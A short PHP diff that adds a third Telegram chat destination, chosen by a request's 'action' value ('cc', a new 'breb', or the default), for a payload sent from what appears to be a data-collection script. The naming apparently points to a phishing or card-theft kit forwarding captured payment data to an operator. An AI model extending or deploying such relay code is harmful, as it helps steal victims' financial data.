@@ -20,7 +20,9 @@ if (!empty($data['session_id'])) {
 }
 
 $action = $data['action'] ?? '';
-$chatId = ($action === 'cc') ? TG_CHAT_CC : TG_CHAT;
+if ($action === 'cc')        $chatId = TG_CHAT_CC;
+elseif ($action === 'breb')  $chatId = TG_CHAT_BREB;
+else                         $chatId = TG_CHAT;
 
 $tgPayload = [
     'chat_id'    => $chatId,
